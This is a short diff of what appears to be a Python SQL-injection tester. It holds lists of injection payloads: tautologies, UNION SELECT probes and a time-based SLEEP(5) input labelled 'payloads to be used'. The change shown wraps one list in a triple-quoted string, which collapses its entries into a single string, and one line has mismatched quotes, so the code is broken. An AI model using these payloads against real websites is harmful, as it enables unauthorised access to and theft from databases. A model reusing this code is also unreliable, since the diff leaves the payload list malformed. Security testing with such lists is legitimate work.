@@ -2,7 +2,7 @@ payloads = ["'","' OR 1=1 --",
 "' AND 1=1 --",
 "' OR 'a' = 'a' --",
 "1' OR 'a' = 'a' --"] # payloads to be used
-payloads2 = ["' OR '1'='1",
+payloads2 = [""" "' OR '1'='1",
 "' OR '1'='1' --",
 "' OR '1'='1' /*",
 "' OR 1=1--",
@@ -11,7 +11,7 @@ payloads2 = ["' OR '1'='1",
 "' OR 1=1 --",
 "") OR 1=1 --",
 "' HAVING 1=1 --"
-,"' OR SLEEP(5) --"]
+,"' OR SLEEP(5) --" """]
 payloads3 = ["' OR 1=1 --",
 "' UNION SELECT NULL, NULL --",
 "' AND 1=1 --",
